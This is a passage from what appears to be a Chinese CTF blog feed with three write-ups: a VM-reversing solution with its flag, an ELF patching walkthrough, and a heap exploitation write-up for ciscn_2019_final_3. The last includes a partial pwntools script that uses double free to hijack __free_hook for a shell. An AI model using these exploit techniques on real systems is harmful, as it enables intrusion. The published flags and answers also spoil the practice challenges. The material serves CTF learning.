class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x84</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="keyword">int</span> a[]=&#123;<span class="number">10</span>,<span class="number">4</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">32</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">33</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">81</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">36</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">54</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">65</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">32</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">65</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">34</span>,<span class="number">7</span>,<span class="number">63</span>,<span class="number">7</span>,<span class="number">52</span>,<span class="number">7</span>,<span class="number">50</span>,<span class="number">7</span>,<span class="number">114</span>,<span class="number">7</span>,<span class="number">51</span>,<span class="number">7</span>,<span class="number">24</span>,<span class="number">7</span>,<span class="number">-89</span>,<span class="number">7</span>,<span class="number">49</span>,<span class="number">7</span>,<span class="number">-15</span>,<span class="number">7</span>,<span class="number">40</span>,<span class="number">7</span>,<span class="number">-124</span>,<span class="number">7</span>,<span class="number">-63</span>,<span class="number">7</span>,<span class="number">30</span>,<span class="number">7</span>,<span class="number">122</span>&#125;;<span class="comment">//运行结果</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> *p=(<span class="keyword">int</span> *)s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(s)/<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,*(p+i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以很明显发现，这个数组刚好114。vm逆向基本是自己定义了指令集做运算的，所以这个不可能是flag，就应该是指令，那么至于指令集应该在这个函数有给解析，接着往下看。</p><h2 id="分析指令"><a href="#分析指令" class="headerlink" title="分析指令"></a>分析指令</h2><p>这里看了很久，里面有一个str char数组和一个char变量v4，然后其它的都是int变量了，一开始对4给int变量都初始化0了，大概率是做一个下标的。然后char数组应该是输入的flag，至于v4变量猜测可能是做一个中间数的，就相当于寄存器一样。</p><p>接下来看看这五个int变量干嘛的。</p><p>先是v9，发现它在每一个case当中都有+1或者+2。就很像我们的ip寄存器，每执行一次指令都往后移，然后这里+1+2应该是某些指令有操作数，导致指令宽度为2，那么v9就是指向当前指令的。而且循环退出条件就是v9&gt;=a2，a2是整个指令的长度。</p><p>其次v8,v8在所有指令中基本都是做str数组的下标，并且做下标的时候，str[v8]都是做源操作数，并且只在1号指令中有自增操作。</p><p>然后v7，这个很简单，只在7号指令中存在，并且做str[100+v7]这样的下标，然后和后一个操作数作比较，如果不等那么退出，那这个就应该是比较指针，7号指令应该是作比较的指令。大概率会做一个运算，运算结果就是str[100]往后的位置的变量。</p><p>接下来看看v6，只在1号指令中出现，并且是以str[100+v6]这样的下标，作为目的操作数。那这个大概率就是做一个变换然后运算结果保存到str[100]开始往后的位置。</p><p>最后一个是v5，只在8号指令出现，作用是取出v4的值保存在str[v5]中。这个v4我们前面分析就大概率是一个普通的寄存器，这里相当于就是取寄存器中的数还给内存一样的。</p><p>那么这些都了解之后就可以很轻松地写出指令的作用了，如下。</p><p><img src="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/2.png" alt="2"></p><p>接下来就手动解析指令，这个指令编码比较简单，无非就是从头开始，遇到2，3，4，5，7就取出后一个数一起与他编码，否则单独作为一个指令编码。</p><p>这个其实可以做程序算的，但是为了一开始理解方便，我也还是手算了。可以发现比较指令都集中在最后了，那么我们从头开始分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">10      //读取数据</span><br><span class="line">4,16    //取出str[0]^16---&gt;rax</span><br><span class="line">8       //rax---&gt;str[0]</span><br><span class="line">//str[0]^=16;</span><br><span class="line">3,5     //取出str[0]-5---&gt;rax</span><br><span class="line">1       //rax---&gt;str[100]</span><br><span class="line">//str[100]=str[0]-5;</span><br><span class="line">//根据后面的比较str[100]=34，所以(str[0]^16)-5==34</span><br><span class="line">//str[0]=55=&#x27;7&#x27;</span><br></pre></td></tr></table></figure><p>很容易算出来了str[0]=’7’。剩下的同理，因为位之间比较独立，并且它有一定规律，手撸还是很块就出来了的。</p><p>下面给出我做这个用的草稿。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">10      //读取数据</span><br><span class="line">4,16    //取出str[0]^16---&gt;rax</span><br><span class="line">8       //rax---&gt;str[0]</span><br><span class="line">//str[0]^=16;</span><br><span class="line">3,5     //取出str[0]-5---&gt;rax</span><br><span class="line">1       //rax---&gt;str[100]</span><br><span class="line">//str[100]=str[0]-5;</span><br><span class="line">//根据后面的比较str[100]=34，所以(str[0]^16)-5==34</span><br><span class="line">//str[0]=55=&#x27;7&#x27;</span><br><span class="line">4,32    //str[1]^32---&gt;rax</span><br><span class="line">8       //rax---&gt;str[1]</span><br><span class="line">//str[1]^=32;</span><br><span class="line">5,3     //str[1]*3---&gt;rax</span><br><span class="line">1       //rax---&gt;str[1]</span><br><span class="line">//str[101]=(str[1]^32)*3</span><br><span class="line">//str[101]=63</span><br><span class="line">//str[1]=53=&#x27;5&#x27;</span><br><span class="line">3,2     </span><br><span class="line">8       //str[2]-=2;</span><br><span class="line">11</span><br><span class="line">1       //str[102]=str[2]-1;</span><br><span class="line">//str[2]-3=52</span><br><span class="line">//str[2]=55=&#x27;7&#x27;</span><br><span class="line">12</span><br><span class="line">8       //str[3]+=1;</span><br><span class="line">4,4</span><br><span class="line">1       //str[103]=str[3]^4;</span><br><span class="line">//(str[3]+1)^4=50</span><br><span class="line">//str[3]=55=&#x27;5&#x27;</span><br><span class="line">5,3</span><br><span class="line">8       //str[4]*=3;</span><br><span class="line">3,33 </span><br><span class="line">1       //str[104]=str[4]-33;</span><br><span class="line">//(str[4]*3)-33=114</span><br><span class="line">//str(4)=49=&#x27;1&#x27;</span><br><span class="line">11</span><br><span class="line">8</span><br><span class="line">11</span><br><span class="line">1</span><br><span class="line">//str[5]-2=51</span><br><span class="line">//str[5]=53=&#x27;5&#x27;</span><br><span class="line">4,9</span><br><span class="line">8       //str[6]^=9;</span><br><span class="line">3,32</span><br><span class="line">1       //str[6]-=32;</span><br><span class="line">//(str[6]^9)-32=24</span><br><span class="line">//str[6]=49=&#x27;1&#x27;</span><br><span class="line">2,81    </span><br><span class="line">8       //str[7]+=81;</span><br><span class="line">4,36</span><br><span class="line">1       //str[7]^=36;</span><br><span class="line">//(str[7]+81)^36=-89;</span><br><span class="line">//str[7]=50=&#x27;2&#x27;</span><br><span class="line">12</span><br><span class="line">8       str[8]+=1;</span><br><span class="line">11</span><br><span class="line">1       str[8]-=1;</span><br><span class="line">str[8]=49=&#x27;1&#x27;</span><br><span class="line">5,2</span><br><span class="line">8       //str[9]*=2;</span><br><span class="line">2,37</span><br><span class="line">1       //str[9]+=37;</span><br><span class="line">//str[9]*2+37=-15</span><br><span class="line">//str[9]=102=&#x27;f&#x27;</span><br><span class="line">2,54</span><br><span class="line">8       //str[10]+=54;</span><br><span class="line">4,65</span><br><span class="line">1       //str[10]^=65;</span><br><span class="line">//(str[10]+54)^65=40</span><br><span class="line">//str[10]=51=&#x27;3&#x27;</span><br><span class="line">2,32</span><br><span class="line">8       //str[11]+=32;</span><br><span class="line">5,1</span><br><span class="line">1       //</span><br><span class="line">//str[11]+32=-124</span><br><span class="line">//str[11]=100=&#x27;d&#x27;</span><br><span class="line">5,3</span><br><span class="line">8       //str[12]*=3;</span><br><span class="line">2,37</span><br><span class="line">1       //str[12]+=37;</span><br><span class="line">//str[12]*3+37=-63</span><br><span class="line">//str[12]=52=&#x27;4&#x27;</span><br><span class="line">4,9     //str[13]^=9;</span><br><span class="line">8</span><br><span class="line">3,32    //str[13]-=32;</span><br><span class="line">1</span><br><span class="line">//(str[13]^9)-32=30;</span><br><span class="line">//str[13]=53=&#x27;7&#x27;</span><br><span class="line">2,65</span><br><span class="line">8       //str[14]+=65;</span><br><span class="line">12</span><br><span class="line">1       //str[14]++;</span><br><span class="line"></span><br><span class="line">//str[14]=56=&#x27;8&#x27;</span><br><span class="line">比较：</span><br><span class="line">7,34,7,63,7,52,7,50</span><br><span class="line">7,114,7,51,7,24</span><br><span class="line">7,-89,7,49,7,-15</span><br><span class="line">7,40,7,-124,7,-63</span><br><span class="line">7,30,7,122</span><br></pre></td></tr></table></figure><p>最后得出这个15位的key就是757515121f3d478 。这个程序基本用不到动态调试，最后就算要跑也只是检验我们的flag是否正确而已，那么我们跑一遍吧。</p><p><img src="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/3.png" alt="3"></p><p>最终提交的flag就是flag{757515121f3d478}</p><p>这题目在vmre中还是比较简单的，推荐入坑虚拟机逆向的师傅一定做做这个，然后自己粗心居然把11和12指令搞反了一开始，导致算出来的就一直不对，这个毛病还是得改改(捂脸</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WUSTCTF2020 level4 writeup</title>
      <link href="/2021/11/02/WUSTCTF2020%20level4%20writeup/"/>
      <url>/2021/11/02/WUSTCTF2020%20level4%20writeup/</url>
      
        <content type="html"><![CDATA[<p>好久没刷re了，来刷点re啊。</p><span id="more"></span><p>buuctf的<a href="https://buuoj.cn/challenges#[WUSTCTF2020]level4">[WUSTCTF2020]level4</a></p><h2 id="静态分析文件"><a href="#静态分析文件" class="headerlink" title="静态分析文件"></a>静态分析文件</h2><p>下载发现是一个64位的elf文件，IDA打开分析。照例先看看明显的字符串明文，发现有left，right，然后还有三种打印(type1,type2,type3)。观察符号列表发现有type1和type2函数。跟进去发现跟我们二叉树的递归输出十分相似，并且type1 先递归了a1+1再递归a1+2，差不多他们就是左子树和右子树。那么type1就是一个后根遍历。然后type2是再中间输出的，是一个中根遍历，那么type3大概率就应该是先根遍历，这里他没有，那么先根遍历大概率就是flag。根据中序遍历和其它一个遍历可以求另外一个遍历，这个在数据结构课里有讲。</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>那么先运行一遍可以发现得到了两个结果</p><p><img src="/2021/11/02/WUSTCTF2020%20level4%20writeup/1.png" alt="1"></p><p>正解显然就是考一个数据结构嘛，但是一个题目总得有多种解法，这里我选择修改函数结构，让它从一个后序遍历变成先序遍历，这里需要patch elf我们先找到type2函数观察它的汇编代码</p><p><img src="/2021/11/02/WUSTCTF2020%20level4%20writeup/2.png" alt="2"></p><p>很明显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jz      short loc_4007FD</span><br></pre></td></tr></table></figure><p>这一条指令对应了if (*a1)的跳转，那么一直到最后的call putchar之前应该都是if范围内的东西，这里需要注意的是，函数调用要把之前的一切准备都算进来。定位找到字节码，然后交换位置，将开头到第二个call type2的指令和之后的到putchar指令对换位置，然后patch上去即可。</p><p>满心欢喜patch之后却发现没有得到想要的结果，为什么呢？</p><p>这里需要理解一下jmp跳转指令了，call和jmp两个指令实际上都属于无条件跳转指令，为什么加以区分呢，call它在跳转之后一定会有一个返回的动作，而jmp则不需要。如果自己去尝试编码的话就会发现它的编码开头都是E8 +4个字节定位代码位置。然后它是怎么定位的呢？首先E8开始，之后四个字节为小端表示这条指令(jmp xxx)的下一条指令的位置到 目标代码地址位置的差值(后者减前者)。举个例子，比如我有如下的机器代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nop  90//1</span><br><span class="line">nop  90//2</span><br><span class="line">nop  90//3</span><br><span class="line">nop  90//4</span><br><span class="line">jmp xxx E8 ?? ?? ?? ??//5</span><br><span class="line">nop  90//6</span><br><span class="line">nop  90//7</span><br><span class="line">nop  90//8</span><br></pre></td></tr></table></figure><p>当编码的4个字节都为00时，那么这条jmp指令的跳转位置就是第六条指令。</p><p>如果为01 00 00 00时，那么这条指令跳转的位置是第七条指令。</p><p>如果为02 00 00 00时，那么这条指令跳转的位置是第8条指令。</p><p>以此类推，注意里面的数值表示字节，而不是指令的数目，如果想往回挑，那么则需要用相应负数的补码表示偏移。</p><p>讲完这些之后就能理解为什么简单的交换代码位置会导致patch失败了，因为指令的地址改变了，所以原来这么多偏移量它已经对应不上相应的函数了。因此需要自己手动操作一下，调整call指令的偏移使之成功patch，这里建议使用keypatch插件，在更改这条指令只需直接输入call 地址，则可以快速完成patch，不用自己算偏移编码。</p><p><img src="/2021/11/02/WUSTCTF2020%20level4%20writeup/3.png" alt="3"></p><p>可以看到代码逻辑按照我们预期的方向更改了，那么我们跑一下，直接输出flag。</p><p><img src="/2021/11/02/WUSTCTF2020%20level4%20writeup/4.png" alt="4"></p><p>flag: wctf2020{This_IS_A_7reE}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2019_final_3 writeup</title>
      <link href="/2021/11/01/ciscn2019_final_3%20writeup/"/>
      <url>/2021/11/01/ciscn2019_final_3%20writeup/</url>
      
        <content type="html"><![CDATA[<p>buu刷题记录：<a href="https://buuoj.cn/challenges#ciscn_2019_final_3">ciscn_final_3</a></p><span id="more"></span><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>今天解决了C++文件换版本的问题，也是一刻没耽误直接做了这道C++题目，不得不说太爽了啊，再也不用因为题目是C++写的就做不了了，话不多说来看文件。</p><h2 id="静态分析elf文件"><a href="#静态分析elf文件" class="headerlink" title="静态分析elf文件"></a>静态分析elf文件</h2><p>题目告知是ubuntu18版本的，给了libc.so.6文件，但是盲猜跟它自己的一样，那就先换好elf文件的版本。checksec观察保护全开。然后IDA打开一看，发现是经典的堆菜单题，提供了两种操作，add和delete。delete很明显free之后指针没有清零，存在UAF漏洞，并且add只允许下标开到0x18，也就是0~24总共能add 25次。然后大小限制在了fastbin大小的范围内，但是很贴心地，每次add之后给了malloc之后的地址。那么大概率通过这里泄露（ps:一开始并没有想到，还想着用IO泄露来着的），思路大概是先通过一次double free修改一个chunk的size为其它大小，然后free一次，再修改成非fastbin范围的堆块，并且防止堆块放入unsortedbin被check fail，最好不要构造堆相互重叠(这句话的意思差不多就是尽量让小堆块完全被大堆块包含，因为它会检测next chunk的)。然后出来了libc的地址之后准备好之前被free的堆块，add添加之后libc地址落入tcache中，再次add泄露这个地址，然后就很简单了，double free劫持free_hook为system函数，再free一个带有/bin/sh字符串的堆块即可getshell。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;something&#x27;</span>,payload)</span><br><span class="line">    <span class="keyword">if</span> index==<span class="number">11</span>:<span class="keyword">return</span> </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    <span class="comment">#if index==11:gdb.attach(p)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./ciscn_final_3&#x27;</span>,<span class="number">28019</span>)</span><br><span class="line">heap_addr=add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">success(<span class="string">&#x27;heap_addr:&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#double free保存一个free的0x30堆块在0号堆块位置</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,p64(heap_addr-<span class="number">0x10</span>))</span><br><span class="line">add(<span 